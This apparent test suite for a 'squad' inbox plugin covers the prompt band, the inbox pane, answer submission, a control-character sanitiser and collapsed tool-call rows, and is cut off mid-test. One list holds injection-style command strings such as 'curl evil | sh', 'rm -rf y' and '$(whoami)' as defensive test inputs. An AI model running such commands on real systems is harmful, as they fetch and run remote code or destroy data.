import { expect, mock, test } from 'claude-code/testing'

const START = { cwd: '/w', surface: null, isInteractive: true } as const
const NOW = '2026-10-15T12:00:00'

const item = (o: Record<string, unknown>) => ({
  id: 'E3', kind: 'answer', state: 'open', title: 'Which branch merges first?', body: 'Body line',
  options: null, options_raw: null, recommendation: null, blocks: 'PI-04', created: '2026-10-13T09:10:00',
  created_precision: 'second', answer: null, done: null, flags: [], ...o,
})
const snap = (items: any[], errors: any[] = []) => ({
  version: 1, home: '/h', now: NOW,
  counts: {
    answer_open: items.filter((i) => i.state === 'open' && i.kind === 'answer').length,
    read_open: items.filter((i) => i.state === 'open' && i.kind === 'read').length,
    waiting: items.filter((i) => i.state === 'answered-waiting').length,
  },
  items, errors,
})

async function boot($: any, on: any, s: unknown, cli?: (argv: string[], stdin?: string) => any) {
  const w = { runs: [] as { argv: string[]; stdin?: string }[], submits: [] as string[], opened: [] as any[], order: [] as string[], current: s }
  mock.env(on, { SQUAD_ROLE: 'manager', SCOPE_DIR: '/h' })
  mock.clock(on)
  on('session.start', (_$: any, e: any) => ({ cwd: e.cwd }))
  on('process.run', (_$: any, e: any) => {
    w.runs.push({ argv: [...e.argv], stdin: e.init?.stdin })
    const r = cli ? cli(e.argv.slice(1), e.init?.stdin) : undefined
    const out = r ?? { exitCode: 0, stdout: JSON.stringify(w.current), stderr: '' }
    return { value: { ...out, isStdoutTruncated: false, isStderrTruncated: false } }
  })
  on('fs.stat', () => ({ value: { kind: 'file', size: 1, mtimeMs: 1, isLink: false } }))
  on('command.register', (_$: any, e: any) => ({ value: { command: e.name } }))
  on('ui.open', (_$: any, e: any) => (w.opened.push(e), w.order.push('open'), { value: { isPlaced: true } }))
  on('ui.close', () => (w.order.push('close'), { value: undefined }))
  on('prompt.submit', (_$: any, e: any) => (w.submits.push(e.text), { text: e.text }))
  on('session.id', () => ({ value: 'sess-1' }))
  on('ui.toast', () => ({ value: undefined }))
  on('ui.render', () => ({ type: 'Text', props: {}, children: ['ENGINE'] }) as any)
  await $.session.start(START)
  return w
}


const SURFACES = ['terminal'] as const

const band = (surface: string, cols = 100, extra: Record<string, unknown> = {}) =>
  ({
    plugin: 'squad', surface, component: 'AbovePrompt',
    props: { hasSurvey: false, isWorking: false, maxRows: 5, bodyColumns: cols, scroll: { bodyRows: 5 }, ...extra },
  }) as any

const pane = (surface: string, cols = 100) =>
  ({
    plugin: 'squad', surface, component: 'Pane', requestId: 'inbox',
    props: { title: 'Inbox', isFocused: true, bodyColumns: cols, placement: 'inline', scroll: { bodyRows: 20 }, view: {} },
  }) as any

const toolUse = (surface: string, command: string, extra: Record<string, unknown> = {}, id = 'tu1') =>
  ({
    plugin: 'squad', surface, component: 'ToolUse', requestId: id,
    props: { tool_use_id: id, tool: 'Bash', input: { command }, isRunning: false, isErrored: false, isInterrupted: false, ...extra },
    viewport: { columns: 100, rows: 30 },
  }) as any

// The drawn tree as text lines: a Text block or a Button is one line.
function textOf(node: any): string {
  if (node === null || node === undefined) return ''
  if (typeof node === 'string') return node
  if (Array.isArray(node)) return node.map(textOf).join('')
  return textOf(node.children ?? [])
}
function lines(node: any, out: string[] = []): string[] {
  if (node === null || node === undefined || typeof node === 'string') return out
  if (Array.isArray(node)) {
    node.forEach((n) => lines(n, out))
    return out
  }
  if (node.type === 'Text') out.push(textOf(node))
  else if (node.type === 'Button') out.push(`[${node.props?.label ?? textOf(node)}]`)
  else if (node.type === 'Input') out.push(`<${node.props?.label ?? ''}${node.props?.value ?? ''}>`)
  else if (node.type === 'Select') out.push(`{${node.props?.label ?? ''}${node.props?.value ?? ''}}`)
  else lines(node.children ?? [], out)
  return out
}
const dump = async (ui: any) => lines(await ui.drawn()).join('\n')

const OPTIONS = [{ key: 'a', text: 'Merge PI-03 first' }, { key: 'b', text: 'Merge PI-01 first' }]
const Q = item({ id: 'E3', options: OPTIONS, recommendation: 'b: less rework' })
const R = item({ id: 'R2', kind: 'read', title: 'PI-03 passed', body: 'evidence in evidence/PI-03', blocks: 'PI-04', created: '2026-10-15T07:00:00' })

async function ui$($: any, surface: string, props: any) {
  return $.ui.mount(props(surface))
}

// --- the band -------------------------------------------------------------------------------

const BANDS: [string, any[], string[], string[]][] = [
  ['band-both', [Q, R], ['Inbox', '1 to answer', ' · ', '1 to read'], ['Open inbox']],
  ['band-reads', [R], ['1 to read'], ['Open inbox']],
  ['band-answers', [Q], ['1 to answer'], ['Open inbox']],
  ['band-waiting', [item({ id: 'E1', state: 'answered-waiting', answer: { text: 'x', option: null, note: null, ts: '2026-10-15T10:42:00', source: 'pane', delivered_ts: null } })], ['1 answered, waiting for the Manager'], ['Open inbox']],
]
for (const [name, items, texts, buttons] of BANDS) {
  test(name, async ($, on) => {
    await boot($, on, snap(items))
    for (const surface of SURFACES) {
      const ui = await $.ui.mount(band(surface))
      const text = await dump(ui)
      for (const t of texts) expect(text).toContain(t)
      expect((await ui.find({ type: 'Button', key: 'open' }))?.text).toContain(buttons[0])
      await ui.unmount()
    }
  })
}

test('band-both adds waiting; band-errors counts problems', async ($, on) => {
  const waiting = item({ id: 'E1', state: 'answered-waiting', answer: { text: 'x', option: null, note: null, ts: '2026-10-15T10:42:00', source: 'pane', delivered_ts: null } })
  await boot($, on, snap([Q, R, waiting], [{ file: 'escalations.md', row: 4, message: 'no question' }]))
  for (const surface of SURFACES) {
    const ui = await $.ui.mount(band(surface))
    const text = await dump(ui)
    expect(text).toContain('1 waiting')
    expect(text).toContain('1 problem')
    await ui.unmount()
  }
})

test('band-errors alone still draws the band', async ($, on) => {
  await boot($, on, snap([], [{ file: 'escalations.md', row: 4, message: 'no question' }, { file: 'escalations.md', row: 5, message: 'bad' }]))
  const ui = await $.ui.mount(band('terminal'))
  expect(await dump(ui)).toContain('2 problems')
})

test('band-none: nothing open, nothing waiting, no error: the band is absent', async ($, on) => {
  await boot($, on, snap([item({ state: 'done', done: { kind: 'read', ts: '2026-10-15T10:00:00', reason: null } })]))
  for (const surface of SURFACES) {
    const ui = await $.ui.mount(band(surface))
    expect(await dump(ui)).toBe('ENGINE')
    await ui.unmount()
  }
})

test('band-narrow: compact under 60 columns, still one line with the button', async ($, on) => {
  await boot($, on, snap([Q, R]))
  for (const cols of [59, 28]) {
    const ui = await $.ui.mount(band('terminal', cols))
    const text = await dump(ui)
    expect(text).toContain('1 answer')
    expect(text).not.toContain('to answer')
    expect(await ui.find({ type: 'Button', key: 'open' })).toBeDefined()
    await ui.unmount()
  }
})

test('band: yields to a survey, counts show while a turn works', async ($, on) => {
  await boot($, on, snap([Q]))
  const working = await $.ui.mount(band('terminal', 100, { isWorking: true }))
  expect(await dump(working)).toContain('1 to answer')
  const survey = await $.ui.mount(band('terminal', 100, { hasSurvey: true }))
  expect(await dump(survey)).toBe('ENGINE')
})

test('band button opens the pane focused', async ($, on) => {
  const w = await boot($, on, snap([Q]))
  const ui = await $.ui.mount(band('terminal'))
  await ui.press({ key: 'open' })
  expect(w.opened.at(-1)).toMatchObject({ id: 'inbox', focus: true })
})

// --- the pane -------------------------------------------------------------------------------

const verbs = (w: any, v: string) => w.runs.filter((r: any) => r.argv[1] === v)
const ANS = (o: Record<string, unknown> = {}) => ({ text: '(b) Merge PI-01 first\nbecause', option: 'b', note: 'because', ts: '2026-10-15T10:42:00', source: 'pane', delivered_ts: null, ...o })
const DONE_R = item({ id: 'R1', kind: 'read', title: 'Old read', state: 'done', done: { kind: 'read', ts: '2026-10-15T10:42:00', reason: null } })
const DONE_E = item({ id: 'E4', title: 'Old question', state: 'done', answer: ANS({ delivered_ts: '2026-10-15T10:43:00' }), done: { kind: 'answered', ts: '2026-10-15T10:30:00', reason: null } })

async function openItem($: any, surface: string, id: string) {
  await $.command.run({ command: 'inbox' })
  const ui = await $.ui.mount(pane(surface))
  await ui.press({ key: id })
  return ui
}

test('list-empty: nothing waits (B-07)', async ($, on) => {
  await boot($, on, snap([]))
  for (const surface of SURFACES) {
    const ui = await $.ui.mount(pane(surface))
    expect(await dump(ui)).toContain('Nothing waits on you.')
    expect(await ui.find({ key: 'done' })).toBeUndefined()
    await ui.unmount()
  }
})

test('list-order: blocks work, blocks nothing, waiting; hotkeys 1..9 and d (B-06)', async ($, on) => {
  const nothing = item({ id: 'E5', title: 'Pick a colour', blocks: 'nothing' })
  const waiting = item({ id: 'E1', title: 'Rename?', state: 'answered-waiting', answer: ANS() })
  await boot($, on, snap([nothing, waiting, Q, R, DONE_R]))
  for (const surface of SURFACES) {
    const ui = await $.ui.mount(pane(surface))
    const text = await dump(ui)
    const at = (s: string) => text.indexOf(s)
    expect(at('Blocks work')).toBeLessThan(at('Blocks nothing'))
    expect(at('Blocks nothing')).toBeLessThan(at('Answered, waiting for the Manager'))
    expect(at('E3')).toBeLessThan(at('R2'))
    expect(at('R2')).toBeLessThan(at('E5'))
    expect(text).toContain('blocks PI-04 · created 2d ago')
    expect(text).toContain('blocks nothing · created')
    expect(text).toContain('(your answer sent 2026-10-15 10:42)')
    expect(text).toContain('Inbox · 2 to answer · 1 to read · 1 waiting'.replace('2 to answer', '2 to answer'))
    const rows = await ui.findAll({ type: 'Button' })
    const hot = rows.map((r: any) => r.props?.hotkey).filter(Boolean)
    expect(hot).toEqual(['1', '2', '3', '4', 'd'])
    expect((await ui.find({ key: 'done' }))?.text).toContain('Done (1)')
    await ui.unmount()
  }
})

test('list-errors: each problem on its own line, other items still show (B-35)', async ($, on) => {
  await boot($, on, snap([Q], [{ file: 'escalations.md', row: 4, message: 'no question' }, { file: 'inbox.jsonl', row: 2, message: 'bad json' }]))
  const ui = await $.ui.mount(pane('terminal'))
  const text = await dump(ui)
  expect(text).toContain('⚠ escalations.md row 4: no question')
  expect(text).toContain('⚠ inbox.jsonl row 2: bad json')
  expect(text).toContain('E3')
})

test('list: a failed refresh is shown as a problem with the last snapshot kept', async ($, on) => {
  const w = await boot($, on, snap([Q]))
  w.current = null
  const ui = await $.ui.mount(pane('terminal'))
  expect(await dump(ui)).toContain('E3')
})

test('list-50 and list-long-title: nothing dropped, the long title cut with an ellipsis (B-36)', async ($, on) => {
  const many = Array.from({ length: 50 }, (_, i) => item({ id: `E${100 + i}`, title: `Question ${i}` }))
  many[0] = item({ id: 'E100', title: 'T'.repeat(300) })
  await boot($, on, snap(many))
  for (const surface of SURFACES) {
    const ui = await $.ui.mount(pane(surface, 80))
    const rows = await ui.findAll({ type: 'Button' })
    expect(rows.length).toBe(50)
    expect(rows[0].text.length).toBeLessThan(90)
    expect(rows[0].text).toContain('…')
    expect(await dump(ui)).toContain('50 to answer')
    await ui.unmount()
  }
  const ui = await $.ui.mount(pane('terminal', 80))
  await ui.press({ key: 'E100' })
  expect(await dump(ui)).toContain('T'.repeat(300))
})

test('item-read: opening marks nothing; Mark read runs read R2 once and goes back (B-09..B-11)', async ($, on) => {
  const w = await boot($, on, snap([Q, R]), (argv) => {
    if (argv[0] === 'read') {
      w.current = snap([Q, item({ ...R, state: 'done', done: { kind: 'read', ts: '2026-10-15T11:00:00', reason: null } })])
      return { exitCode: 0, stdout: 'R2 marked read', stderr: '' }
    }
  })
  const ui = await openItem($, 'terminal', 'R2')
  expect(verbs(w, 'read').length).toBe(0)
  expect(verbs(w, 'answer').length).toBe(0)
  const text = await dump(ui)
  expect(text).toContain('PI-03 passed')
  expect(text).toContain('evidence in evidence/PI-03')
  expect((await ui.find({ key: 'mark-read' }))?.props?.hotkey).toBe('m')
  expect((await ui.find({ key: 'back' }))?.props?.hotkey).toBe('b')
  await Promise.all([ui.press({ key: 'mark-read' }), ui.press({ key: 'mark-read' })])
  expect(verbs(w, 'read').length).toBe(1)
  expect(verbs(w, 'read')[0].argv.slice(1)).toEqual(['read', 'R2'])
  const after = await dump(ui)
  expect(after).toContain('✓ R2 marked read.')
  expect(after).not.toContain('PI-03 passed')
})

test('item-answer-options: options, recommendation as text only, nothing picked, hotkeys off (T-1)', async ($, on) => {
  await boot($, on, snap([Q]))
  for (const surface of SURFACES) {
    const ui = await openItem($, surface, 'E3')
    const text = await dump(ui)
    expect(text).toContain('(a) Merge PI-03 first')
    expect(text).toContain('Manager recommends: b: less rework')
    expect(text).toContain('Picked: none yet')
    expect((await ui.find({ key: 'pick' }))?.props?.value).toBeUndefined()
    expect((await ui.find({ key: 'back' }))?.props?.hotkey).toBeUndefined()
    expect(await ui.find({ key: 'note' })).toBeDefined()
    await ui.unmount()
  }
})

test('item-answer-free and item-answer-unparsed', async ($, on) => {
  await boot($, on, snap([item({ id: 'E7', title: 'Free?' }), item({ id: 'E8', title: 'Odd', options_raw: '(a) one (b) two ;; weird' })]))
  for (const surface of SURFACES) {
    const free = await openItem($, surface, 'E7')
    expect(await free.find({ key: 'reply' })).toBeDefined()
    expect(await free.find({ key: 'pick' })).toBeUndefined()
    await free.unmount()
    const odd = await openItem($, surface, 'E8')
    const text = await dump(odd)
    expect(text).toContain('Options, as the Manager wrote them')
    expect(text).toContain('(a) one (b) two ;; weird')
    expect(await odd.find({ key: 'pick' })).toBeUndefined()
    expect(await odd.find({ key: 'reply' })).toBeDefined()
    await odd.unmount()
  }
})

test('item-long-body: 12 lines then Show all gives the whole body (B-36)', async ($, on) => {
  const body = Array.from({ length: 40 }, (_, i) => `line ${i + 1}`).join('\n')
  await boot($, on, snap([item({ id: 'R9', kind: 'read', body })]))
  const ui = await openItem($, 'terminal', 'R9')
  let text = await dump(ui)
  expect(text).toContain('line 12')
  expect(text).not.toContain('line 13')
  expect(text).toContain('… 28 more lines')
  await ui.press({ key: 'show-all' })
  text = await dump(ui)
  expect(text).toContain('line 40')
  expect(await ui.find({ key: 'show-all' })).toBeUndefined()
})

test('answer flow: pick b, note, submit: the CLI runs once with argv and stdin, then delivery (AC3)', async ($, on) => {
  let answered = false
  const w = await boot($, on, snap([Q]), (argv) => {
    if (argv[0] === 'answer') {
      answered = true
      w.current = snap([item({ ...Q, state: 'answered-waiting', answer: ANS() })])
      return { exitCode: 0, stdout: '', stderr: '' }
    }
    if (argv[0] === 'delivered') return { exitCode: 0, stdout: '', stderr: '' }
  })
  const ui = await openItem($, 'terminal', 'E3')
  await ui.select({ key: 'pick', value: 'b' })
  expect(await dump(ui)).toContain('Picked: (b) Merge PI-01 first')
  await ui.input({ key: 'note', text: 'because', kind: 'change' })
  await Promise.all([ui.press({ key: 'send' }), ui.press({ key: 'send' })])
  expect(answered).toBe(true)
  const ans = verbs(w, 'answer')
  expect(ans.length).toBe(1)
  expect(ans[0].argv.slice(1)).toEqual(['answer', 'E3', '--option', 'b', '--source', 'pane'])
  expect(ans[0].stdin).toBe('because')
  await new Promise((r) => setTimeout(r, 20))
  expect(w.submits.some((t) => t.includes('(b) Merge PI-01 first\nbecause'))).toBe(true)
  expect(await dump(ui)).toContain('✓ E3 answered. Sending to the Manager.')
})

test('answer flow: Enter in the note submits too, and a free reply goes by stdin', async ($, on) => {
  const w = await boot($, on, snap([item({ id: 'E7', title: 'Free?' })]), (argv) => (argv[0] === 'answer' ? { exitCode: 0, stdout: '', stderr: '' } : undefined))
  const ui = await openItem($, 'terminal', 'E7')
  await ui.input({ key: 'reply', text: 'multi\nline "quoted"' })
  const ans = verbs(w, 'answer')
  expect(ans.length).toBe(1)
  expect(ans[0].argv.slice(1)).toEqual(['answer', 'E7', '--source', 'pane'])
  expect(ans[0].stdin).toBe('multi\nline "quoted"')
})

test('item-error-empty: an empty answer is refused with the item open (B-32); a note alone is fine (Q-1)', async ($, on) => {
  const w = await boot($, on, snap([Q]), (argv) => (argv[0] === 'answer' ? { exitCode: 0, stdout: '', stderr: '' } : undefined))
  const ui = await openItem($, 'terminal', 'E3')
  await ui.press({ key: 'send' })
  expect(verbs(w, 'answer').length).toBe(0)
  const text = await dump(ui)
  expect(text).toContain('Nothing to send: pick an option or type a reply.')
  expect(text).toContain('Which branch merges first?')
  await ui.input({ key: 'note', text: '   ', kind: 'change' })
  await ui.press({ key: 'send' })
  expect(verbs(w, 'answer').length).toBe(0)
  await ui.input({ key: 'note', text: 'none of them', kind: 'change' })
  await ui.press({ key: 'send' })
  expect(verbs(w, 'answer').length).toBe(1)
  expect(verbs(w, 'answer')[0].argv.slice(1)).toEqual(['answer', 'E3', '--source', 'pane'])
})

test('item-error-exit3: the CLI message verbatim, the draft kept, the item shows as handled (B-17, B-34)', async ($, on) => {
  const w = await boot($, on, snap([Q]), (argv) => {
    if (argv[0] === 'answer') {
      w.current = snap([item({ ...Q, state: 'done', answer: ANS({ source: 'chat' }), done: { kind: 'answered', ts: '2026-10-15T10:02:00', reason: null } })])
      return { exitCode: 3, stdout: '', stderr: 'E3 was answered by chat at 10:02\n' }
    }
  })
  const ui = await openItem($, 'terminal', 'E3')
  await ui.select({ key: 'pick', value: 'a' })
  await ui.input({ key: 'note', text: 'my words', kind: 'change' })
  await ui.press({ key: 'send' })
  const text = await dump(ui)
  expect(text).toContain('⚠ E3 was answered by chat at 10:02')
  expect(text).toContain('This item changed while you were reading it.')
  expect(text).toContain('Your unsent note (not sent):')
  expect(text).toContain('my words')
  expect(await ui.find({ key: 'send' })).toBeUndefined()
})

test('item-error-unreachable: the item stays open, text kept, retry works', async ($, on) => {
  let fail = true
  const w = await boot($, on, snap([item({ id: 'E7', title: 'Free?' })]), (argv) => {
    if (argv[0] === 'answer') return fail ? { exitCode: 1, stdout: '', stderr: 'boom\nmore' } : { exitCode: 0, stdout: '', stderr: '' }
  })
  const ui = await openItem($, 'terminal', 'E7')
  await ui.input({ key: 'reply', text: 'keep me', kind: 'change' })
  await ui.press({ key: 'send' })
  let text = await dump(ui)
  expect(text).toContain('Could not reach the inbox: boom')
  expect(text).not.toContain('more')
  expect(text).toContain('keep me')
  fail = false
  await ui.press({ key: 'send' })
  expect(verbs(w, 'answer').length).toBe(2)
})

test('item-answer saved but unreadable: the message shows and the input clears (B-17)', async ($, on) => {
  let down = false
  const w = await boot($, on, snap([item({ id: 'E7', title: 'Free?' })]), (argv) => {
    if (argv[0] === 'answer') {
      down = true
      return { exitCode: 0, stdout: '', stderr: '' }
    }
    if (argv[0] === 'list' && down) return { exitCode: 1, stdout: '', stderr: 'down' }
  })
  const ui = await openItem($, 'terminal', 'E7')
  await ui.input({ key: 'reply', text: 'hello', kind: 'change' })
  await ui.press({ key: 'send' })
  const text = await dump(ui)
  expect(text).toContain('E7 answered; it is delivered to the Manager at the next start')
  expect(text).not.toContain('hello')
})

const HANDLED: [string, any, string[]][] = [
  ['item-answered-waiting', item({ ...Q, state: 'answered-waiting', answer: ANS() }), ['Answered 2026-10-15 10:42, waiting for the Manager.', '(b) Merge PI-01 first']],
  ['item-answered', DONE_E, ['Answered 2026-10-15 10:30, delivered 2026-10-15 10:43.']],
  ['item-answered-chat', item({ ...Q, state: 'done', answer: ANS({ source: 'chat' }), done: { kind: 'answered', ts: '2026-10-15T10:44:00', reason: null } }), ['Answered in chat 2026-10-15 10:44.']],
  ['item-answered-file', item({ ...Q, state: 'done', done: { kind: 'answered-file', ts: '2026-10-15T10:44:00', reason: null } }), ['Answered in the file (not through the inbox).']],
  ['item-withdrawn', item({ ...Q, state: 'done', done: { kind: 'withdrawn', ts: '2026-10-15T10:50:00', reason: 'obsolete' } }), ['Withdrawn by the Manager 2026-10-15 10:50: obsolete.']],
  ['item-removed', item({ ...Q, state: 'done', done: { kind: 'removed', ts: '2026-10-15T10:50:00', reason: null } }), ['Removed from escalations.md before an answer.']],
]
for (const [name, it, texts] of HANDLED) {
  test(name, async ($, on) => {
    await boot($, on, snap([it]))
    for (const surface of SURFACES) {
      let ui
      if (it.state === 'done') {
        await $.command.run({ command: 'inbox' })
        ui = await $.ui.mount(pane(surface))
        await ui.press({ key: 'done' })
        await ui.press({ key: `d-${it.id}` })
      } else {
        ui = await openItem($, surface, it.id)
      }
      const text = await dump(ui)
      for (const t of texts) expect(text).toContain(t)
      expect(await ui.find({ key: 'send' })).toBeUndefined()
      expect((await ui.find({ key: 'back' }))?.props?.hotkey).toBe('b')
      await ui.unmount()
    }
  })
}

test('item-cell-not-written: an answered item with the flag says the board may still list it', async ($, on) => {
  await boot($, on, snap([item({ ...Q, state: 'answered-waiting', answer: ANS(), flags: ['cell-not-written'] }), item({ id: 'E4', state: 'answered-waiting', answer: ANS() })]))
  const ui = await openItem($, 'terminal', 'E3')
  expect(await dump(ui)).toContain('Answer kept. escalations.md was not updated, so the board may still list it.')
  await ui.unmount()
  const other = await openItem($, 'terminal', 'E4')
  expect(await dump(other)).not.toContain('Answer kept.')
})

test('item-delivery-failed: the answered-waiting item says delivery is not confirmed', async ($, on) => {
  const waiting = item({ ...Q, state: 'answered-waiting', answer: ANS() })
  const w = await boot($, on, snap([waiting]), (argv) => (argv[0] === 'delivered' ? { exitCode: 2, stdout: '', stderr: 'read-only' } : undefined))
  await w
  const ui = await openItem($, 'terminal', 'E3')
  expect(await dump(ui)).toContain('answered, delivery not confirmed')
})

test('done-list and done-empty: newest first, a row opens read-only, Back returns', async ($, on) => {
  await boot($, on, snap([DONE_E, DONE_R, Q]))
  const ui = await $.ui.mount(pane('terminal'))
  await ui.press({ key: 'done' })
  const text = await dump(ui)
  expect(text.indexOf('R1')).toBeLessThan(text.indexOf('E4'))
  expect(text).toContain('read')
  await ui.press({ key: 'd-E4' })
  expect(await dump(ui)).toContain('Old question')
  expect(await ui.find({ key: 'send' })).toBeUndefined()
  await ui.press({ key: 'back' })
  expect(await dump(ui)).toContain('Done · newest first')
  await ui.press({ key: 'back' })
  expect(await dump(ui)).toContain('Which branch merges first?')
})

test('done-empty', async ($, on) => {
  await boot($, on, snap([Q]))
  const ui = await $.ui.mount(pane('terminal'))
  expect(await ui.find({ key: 'done' })).toBeUndefined()
})


// --- the sanitiser (M5) ---------------------------------------------------------------------

const DIRTY: [string, string][] = [
  ['ESC', '\u001b[31mred\u001b[0m'],
  ['C0', 'a\u0000b\u0007c\u0008d'],
  ['C1', 'a\u0085b\u009bc'],
  ['DEL', 'a\u007fb'],
  ['CR', 'a\rb'],
  ['bidi', 'a‮b⁦c⁩d'],
]
// eslint-disable-next-line no-control-regex
const FORBIDDEN = /[\u0000-\u0008\u000b-\u001f\u007f-\u009f‪-‮⁦-⁩\r]/

test('sanitiser: no control, DEL, CR or bidi character is drawn from any item field, one test per class', async ($, on) => {
  const items = DIRTY.map(([, bad], i) =>
    item({
      id: `E${31 + i}`, title: `T${bad}`, body: `B${bad}\nsecond`, recommendation: `R${bad}`, blocks: `X${bad}`,
      options: [{ key: 'a', text: `O${bad}` }], options_raw: null,
    }),
  )
  await boot($, on, snap(items, [{ file: `f${DIRTY[0][1]}`, row: 1, message: `m${DIRTY[1][1]}` }]))
  const b = await $.ui.mount(band('terminal'))
  expect(FORBIDDEN.test(await dump(b))).toBe(false)
  for (let i = 0; i < DIRTY.length; i++) {
    await $.command.run({ command: 'inbox' })
    const list = await $.ui.mount(pane('terminal'))
    expect(FORBIDDEN.test(await dump(list))).toBe(false)
    await list.press({ key: `E${31 + i}` })
    const itemText = await dump(list)
    expect({ klass: DIRTY[i][0], bad: FORBIDDEN.test(itemText) }).toEqual({ klass: DIRTY[i][0], bad: false })
    expect(itemText).toContain('second')
    await list.unmount()
  }
})

test('sanitiser: tab and newline stay in a body', async ($, on) => {
  await boot($, on, snap([item({ id: 'R5', kind: 'read', body: 'a\tb\nc' })]))
  const ui = await openItem($, 'terminal', 'R5')
  const text = await dump(ui)
  expect(text).toContain('a\tb')
  expect(text).toContain('\nc')
})

test('sanitiser: a toast title and an error message are clean too', async ($, on) => {
  await boot($, on, snap([item({ id: 'E7', title: 'Free?' })]), (argv) => (argv[0] === 'answer' ? { exitCode: 3, stdout: '', stderr: 'E7 \u001b[31mlost\u001b[0m\n' } : undefined))
  const ui = await openItem($, 'terminal', 'E7')
  await ui.input({ key: 'reply', text: 'x' })
  const text = await dump(ui)
  expect(FORBIDDEN.test(text)).toBe(false)
  expect(text).toContain('E7 [31mlost[0m'.replace('\u001b', ''))
})

// --- the collapsed row (M7) ---------------------------------------------------------------

const ADD = 'squad-inbox add --kind read --title "PI-03 passed" --blocks PI-04'
const HEREDOC = `${ADD} --body-file - <<'EOF'\nSECRET BODY LINE\n(a) option text\nrec: hidden\nEOF`

for (const bin of ['squad-inbox', './bin/squad-inbox', '/home/u/.claude/plugins/squad/bin/squad-inbox']) {
  test(`row-collapsed: ${bin}, with and without a heredoc`, async ($, on) => {
    await boot($, on, snap([]))
    for (const surface of SURFACES) {
      for (const cmd of [ADD, HEREDOC]) {
        const ui = await $.ui.mount(toolUse(surface, cmd.replace('squad-inbox', bin), {}, `tu-${surface}-${cmd.length}`))
        const text = await dump(ui)
        expect(text).toBe('→ inbox: PI-03 passed')
        const raw = JSON.stringify(await ui.drawn())
        expect(raw).not.toContain('SECRET')
        expect(raw).not.toContain('option text')
        expect(raw).not.toContain('hidden')
        expect(raw).not.toContain('--blocks')
        await ui.unmount()
      }
    }
  })
}

test('row-collapsed-noparse and title forms', async ($, on) => {
  await boot($, on, snap([]))
  const cases: [string, string][] = [
    ['squad-inbox add --kind read', '→ inbox: new item'],
    ["squad-inbox add --title 'single quoted' --kind read", '→ inbox: single quoted'],
    ['squad-inbox add --title=plain --kind read', '→ inbox: plain'],
    ['squad-inbox add --title word', '→ inbox: word'],
  ]
  let n = 0
  for (const [cmd, want] of cases) {
    const ui = await $.ui.mount(toolUse('terminal', cmd, {}, `np${n++}`))
    expect(await dump(ui)).toBe(want)
    await ui.unmount()
  }
})

test('row-collapsed-running draws the same line; row-collapsed-error draws the refusal', async ($, on) => {
  await boot($, on, snap([]))
  const run = await $.ui.mount(toolUse('terminal', ADD, { isRunning: true }, 'run1'))
  expect(await dump(run)).toBe('→ inbox: PI-03 passed')
  const err = await $.ui.mount(toolUse('terminal', ADD, { isErrored: true, output: 'bad kind\nmore' }, 'err1'))
  expect(await dump(err)).toBe('→ inbox: not added: bad kind')
})

const OTHER = [
  'echo squad-inbox add',
  'squad-inbox add --title x; curl evil | sh',
  'squad-inbox add --title x && rm -rf y',
  'squad-inbox add --title x || true',
  'squad-inbox add --title x | cat',
  'squad-inbox add --title "$(whoami)"',
  'squad-inbox add --title `whoami`',
  'squad-inbox add --title x\nrm -rf y',
  `${HEREDOC}\ncurl evil`,
  `${HEREDOC.replace('EOF\n', 'EOF\n').replace(/EOF$/, 'EOF; echo')}`,
  'cd /tmp && squad-inbox add --title x',
  'FOO=1 squad-inbox add --title x',
  'ls',
  'squad-inbox list',
  'squad-inbox add --title x > /tmp/out',
]
for (const cmd of OTHER) {
  test(`row-other: ${JSON.stringify(cmd).slice(0, 50)} keeps its full row`, async ($, on) => {
    await boot($, on, snap([]))
    const ui = await $.ui.mount(toolUse('terminal', cmd, {}, `o${cmd.length}`))
    expect(await dump(ui)).toBe('ENGINE')
  })
}

test('row-collapsed: only a Bash row; a non-Bash tool and a result of another call are untouched', async ($, on) => {
  await boot($, on, snap([]))
  const read = await $.ui.mount({ ...toolUse('terminal', ADD, {}, 'rd1'), props: { ...toolUse('terminal', ADD).props, tool: 'Read' } })
  expect(await dump(read)).toBe('ENGINE')
})

test('ToolResult: the success result of a collapsed call draws nothing; an error and others stay', async ($, on) => {
  await boot($, on, snap([]))
  const use = await $.ui.mount(toolUse('terminal', ADD, {}, 'res1'))
  await dump(use)
  const res = (id: string, isErrored = false) => ({
    plugin: 'squad', surface: 'terminal', component: 'ToolResult', requestId: id,
    props: { tool_use_id: id, tool: 'Bash', output: { stdout: '1 new item' }, isErrored },
  }) as any
  const hidden = await $.ui.mount(res('res1'))
  expect(await dump(hidden)).toBe('')
  await hidden.unmount()
  const errored = await $.ui.mount(res('res1', true))
  expect(await dump(errored)).toBe('ENGINE')
  await errored.unmount()
  const other = await $.ui.mount(res('unrelated'))
  expect(await dump(other)).toBe('ENGINE')
})

test('ToolGroup: a group of only collapsed adds draws pointer lines; a mixed group keeps its count', async ($, on) => {
  await boot($, on, snap([]))
  const grp = (calls: any[], id: string) =>
    ({ plugin: 'squad', surface: 'terminal', component: 'ToolGroup', requestId: id, props: { calls, isActive: false, isExpanded: false } }) as any
  const call = (command: string, extra: Record<string, unknown> = {}) => ({ tool: 'Bash', input: { command }, isRunning: false, isErrored: false, isInterrupted: false, ...extra })
  const ui = await $.ui.mount(grp([call(ADD), call(HEREDOC)], 'g1'))
  expect(await dump(ui)).toBe('→ inbox: PI-03 passed\n→ inbox: PI-03 passed')
  expect(JSON.stringify(await ui.drawn())).not.toContain('SECRET')
  const mixed = await $.ui.mount(grp([call(ADD), call('ls')], 'g2'))
  expect(await dump(mixed)).toBe('ENGINE')
  const bad = await $.ui.mount(grp([call(ADD, { isErrored: true })], 'g3'))
  expect(await dump(bad)).toBe('ENGINE')
})

test('ToolResult: a failed add (exit code) keeps its result; a chained command is untouched in all three hooks', async ($, on) => {
  await boot($, on, snap([]))
  const res = (id: string, output: unknown) =>
    ({ plugin: 'squad', surface: 'terminal', component: 'ToolResult', requestId: id, props: { tool_use_id: id, tool: 'Bash', output, isErrored: false } }) as any
  const use = await $.ui.mount(toolUse('terminal', ADD, {}, 'fail1'))
  await dump(use)
  const failed = await $.ui.mount(res('fail1', { stdout: '', stderr: 'bad', exitCode: 2 }))
  expect(await dump(failed)).toBe('ENGINE')
  const chained = 'squad-inbox add --title x; echo hi'
  const useChained = await $.ui.mount(toolUse('terminal', chained, {}, 'chain1'))
  expect(await dump(useChained)).toBe('ENGINE')
  const grp = await $.ui.mount({
    plugin: 'squad', surface: 'terminal', component: 'ToolGroup', requestId: 'gchain',
    props: { calls: [{ tool_use_id: 'chain1', tool: 'Bash', input: { command: chained }, isRunning: false, isErrored: false, isInterrupted: false }], isActive: false, isExpanded: false },
  } as any)
  expect(await dump(grp)).toBe('ENGINE')
